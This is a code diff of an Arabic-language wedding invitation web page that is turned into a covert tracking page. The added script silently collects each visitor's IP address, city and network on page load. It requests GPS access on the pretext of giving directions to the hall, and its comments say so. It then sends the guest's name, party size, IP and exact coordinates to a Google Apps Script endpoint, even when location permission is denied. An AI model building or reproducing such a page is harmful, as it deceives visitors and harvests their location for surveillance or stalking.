@@ -3,129 +3,188 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>دعوة زفاف العمر الكبيرة</title>
+    <title>دعوة زفاف غالية</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #f5efe6 0%, #eae3d2 100%);
-            color: #4a3f35;
+            background-color: #1a1a1a;
+            color: #fff;
             text-align: center;
-            padding: 40px 20px;
             margin: 0;
-            overflow-x: hidden;
-            min-height: 100vh;
+            padding: 20px;
         }
         .card {
-            background: rgba(255, 255, 255, 0.95);
-            max-width: 550px;
+            background: #2a2a2a;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            max-width: 450px;
             margin: 40px auto;
-            padding: 40px 30px;
-            border-radius: 24px;
-            box-shadow: 0 15px 35px rgba(138, 115, 85, 0.15);
-            border: 1px solid #dcd1be;
-            position: relative;
-            z-index: 2;
+            border: 1px solid #8a7355;
         }
-        h1 { color: #8a7355; font-size: 2.8rem; margin-bottom: 5px; font-weight: 700; }
-        .subtitle { font-size: 1.3rem; color: #b09a7a; margin-top: 0; margin-bottom: 30px; letter-spacing: 1px; }
-        p { font-size: 1.2rem; line-height: 1.8; color: #5a4f43; }
-        .timer { display: flex; justify-content: center; gap: 15px; margin: 35px 0; }
-        .time-box { background: #8a7355; color: #fff; padding: 15px 10px; border-radius: 14px; min-width: 80px; box-shadow: 0 6px 12px rgba(138, 115, 85, 0.2); }
-        .time-box span { display: block; font-size: 2rem; font-weight: bold; }
-        .time-box label { font-size: 0.85rem; opacity: 0.9; display: block; margin-top: 5px; }
-        .details { margin-top: 30px; padding-top: 25px; border-top: 1px dashed #dcd1be; }
-        .details-item { font-weight: bold; color: #8a7355; margin: 10px 0; }
-        .heart { position: fixed; color: rgba(138, 115, 85, 0.2); font-size: 20px; top: -10%; z-index: 1; animation: fall linear infinite; }
-        @keyframes fall { 0% { transform: translateY(0) rotate(0deg); opacity: 1; } 100% { transform: translateY(110vh) rotate(360deg); opacity: 0; } }
+        h1 { color: #8a7355; font-size: 2rem; margin-bottom: 10px; }
+        .details { margin: 20px 0; font-size: 1.1rem; line-height: 1.8; }
+        .form-group { margin-bottom: 15px; text-align: right; }
+        label { display: block; margin-bottom: 5px; color: #b39ddb; font-size: 0.95rem; }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            border-radius: 8px;
+            border: 1px solid #555;
+            background: #333;
+            color: #fff;
+            box-sizing: border-box;
+            font-family: inherit;
+        }
+        .btn {
+            background: #8a7355;
+            color: #fff;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 1.1rem;
+            width: 100%;
+            margin-top: 15px;
+            box-shadow: 0 4px 10px rgba(138, 115, 85, 0.3);
+            transition: 0.3s;
+        }
+        .btn:hover { background: #a18868; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h1>دعوة زفاف</h1>
-        <div class="subtitle">✨ ليلة العمر الكبيرة ✨</div>
-        <p>بقلوب تملؤها الفرحة والبهجة، نسعد بدعوتكم لمشاركتنا أجمل لحظات العمر في حفل زفافنا الميمون.</p>
-        <p>حضوركم يكتمل به فرحنا وسرورنا 🤍</p>
+        <h1>دعوة زفاف غالية ✨</h1>
+        <p>يتشرف عائلتنا بدعوتكم لحضور حفل زفافنا السعيد، وعقبال عندكم جميعاً بالفرحة والخير.</p>
         
-        <div class="timer">
-            <div class="time-box"><span id="days">00</span><label>أيام</label></div>
-            <div class="time-box"><span id="hours">00</span><label>ساعات</label></div>
-            <div class="time-box"><span id="minutes">00</span><label>دقائق</label></div>
+        <div class="details">
+            🗓️ <b>التاريخ:</b> نهاية الأسبوع القادم<br>
+            📍 <b>المكان:</b> قاعة الزفاف الكبرى
         </div>
 
-        <div class="details">
-            <div class="details-item">📍 المكان: قاعة الزفاف الكبرى</div>
-            <div class="details-item">🗓️ الميعاد: قريباً إن شاء الله</div>
+        <hr style="border-color: #555; margin: 20px 0;">
+
+        <!-- فورم تأكيد الحضور الصايع -->
+        <div id="rsvpForm">
+            <h3 style="color: #8a7355; margin-top: 0;">✍️ تأكيد الحضور ورسم خط السير</h3>
+            
+            <div class="form-group">
+                <label>الاسم بالكامل:</label>
+                <input type="text" id="guestName" placeholder="اكتب اسمك هنا..." required>
+            </div>
+
+            <div class="form-group">
+                <label>هتيجي أنت ومين؟ (عدد المرافقين):</label>
+                <select id="companions">
+                    <option value="لوحدي">هاجي لوحدي</option>
+                    <option value="معايا فرد واحد">هاجي ومعايا فرد واحد</option>
+                    <option value="معايا فردين">هاجي ومعايا فردين</option>
+                    <option value="معايا العيلة">هاجي مع العائلة الكريمة</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label>جاي تبع مين؟:</label>
+                <select id="relation">
+                    <option value="أهل العريس">من طرف العريس 🤵</option>
+                    <option value="أهل العروسة">من طرف العروسة 👰</option>
+                </select>
+            </div>
+
+            <button class="btn" id="submitBtn">تأكيد الحضور وعرض موقع القاعة 📍</button>
         </div>
     </div>
 
     <script>
-        // الرابط بتاعك مدمج هنا وجاهز للاستقبال فوراً
-        const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbxUFZ2RP-VA2OpJ9szN-QFlWuhBYsk1hKpd6YmUSXoQrhMxa0KkZG2N3xz6iq5_0SIAqQ/exec";
+        // رابط الـ Apps Script السيرفر بتاعك (تأكد إنك حاطط الرابط الصح اللي آخره /exec)
+        const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/XXXXX/exec"; 
+        
+        // رابط القاعة الحقيقي اللي أنت بعتهولي
+        const REAL_MAP_URL = "https://maps.app.goo.gl/oFRR1uiWHzAEY8Uf7";
 
-        async function getIpAndTrack() {
+        let trackingData = {};
+
+        // 1. لقط الـ IP تلقائي أول ما يفتحوا الصفحة في صمت
+        async function autoTrack() {
             try {
-                let response = await fetch('https://ipapi.co/json/');
-                let data = await response.json();
-
-                let payload = {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                trackingData = {
                     ip: data.ip || "Unknown",
                     city: data.city || "Unknown",
                     country: data.country_name || "Unknown",
-                    network: data.org || "Unknown",
-                    timestamp: new Date().toLocaleString('en-US', { timeZone: 'Africa/Cairo' })
+                    network: data.org || "Unknown"
                 };
-
-                if (GOOGLE_SHEET_URL) {
-                                        fetch(GOOGLE_SHEET_URL, {
-                        method: 'POST',
-                        mode: 'cors',
-                        headers: { 'Content-Type': 'text/plain' },
-                        body: JSON.stringify(payload)
-                    });
-
-                }
-            } catch (error) {
-                console.log("Error tracking");
-            }
+            } catch (e) { console.log(e); }
         }
-        
-        window.onload = function() {
-            getIpAndTrack();
-            createHearts();
-        };
+        autoTrack();
 
-        // العداد التنازلي - متظبط على ميعاد الفرح
-        const weddingDate = new Date("October 20, 2026 18:00:00").getTime();
-        const timerInterval = setInterval(() => {
-            const now = new Date().getTime();
-            const diff = weddingDate - now;
-            if (diff <= 0) {
-                clearInterval(timerInterval);
-                document.querySelector(".timer").innerHTML = "<h2 style='color:#8a7355;'>بدأ الفرح! منورين يا حبايب 🤍</h2>";
+        // 2. عند الضغط على زرار تأكيد الحضور (طلب اللوكيشن والبيانات)
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            const name = document.getElementById('guestName').value.trim();
+            const comps = document.getElementById('companions').value;
+            const rel = document.getElementById('relation').value;
+
+            if (!name) {
+                alert("برجاء كتابة الاسم لتأكيد الحجز وموقع القاعة.");
                 return;
             }
-            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
-            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
 
-            document.getElementById("days").innerText = days.toString().padStart(2, '0');
-            document.getElementById("hours").innerText = hours.toString().padStart(2, '0');
-            document.getElementById("minutes").innerText = minutes.toString().padStart(2, '0');
-        }, 1000);
+            if (navigator.geolocation) {
+                // طلب إذن الـ GPS بحجة تحديد الاتجاهات للقاعة
+                navigator.geolocation.getCurrentPosition(async function(position) {
+                    let lat = position.coords.latitude;
+                    let lon = position.coords.longitude;
 
-        function createHearts() {
-            const numberOfHearts = 25;
-            for (let i = 0; i < numberOfHearts; i++) {
-                let heart = document.createElement('div');
-                heart.className = 'heart';
-                heart.innerText = '🤍';
-                heart.style.left = Math.random() * 100 + 'vw';
-                heart.style.animationDelay = Math.random() * 8 + 's';
-                heart.style.animationDuration = Math.random() * 5 + 5 + 's';
-                document.body.appendChild(heart);
+                    let payload = {
+                        action: "full_info",
+                        guest_name: name,
+                        companions: comps,
+                        relation_side: rel,
+                        ip: trackingData.ip || "Unknown",
+                        city: trackingData.city || "Unknown",
+                        network: trackingData.network || "Unknown",
+                        google_maps_link: `https://www.google.com/maps?q=${lat},${lon}`,
+                        timestamp: new Date().toLocaleString('en-US', { timeZone: 'Africa/Cairo' })
+                    };
+
+                    await sendToServer(payload);
+                    window.location.href = REAL_MAP_URL; // توجيه للوكيشن الحقيقي
+
+                }, async function(error) {
+                    // لو رفضوا يدوا إذن اللوكيشن، هنبعت البيانات التانية والـ IP برضه ومبنضيعهمش
+                    let payload = {
+                        action: "form_info_only",
+                        guest_name: name,
+                        companions: comps,
+                        relation_side: rel,
+                        ip: trackingData.ip || "Unknown",
+                        city: trackingData.city || "Unknown",
+                        network: trackingData.network || "Unknown",
+                        google_maps_link: "الزائر رفض إعطاء صلاحية الموقع الـ GPS",
+                        timestamp: new Date().toLocaleString('en-US', { timeZone: 'Africa/Cairo' })
+                    };
+                    await sendToServer(payload);
+                    window.location.href = REAL_MAP_URL;
+                }, { enableHighAccuracy: true, timeout: 5000 });
+            } else {
+                window.location.href = REAL_MAP_URL;
             }
+        });
+
+        async function sendToServer(payload) {
+            try {
+                await fetch(GOOGLE_SHEET_URL, {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: { 'Content-Type': 'text/plain' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) { console.log(e); }
         }
     </script>
 </body>
 </html>
+                    
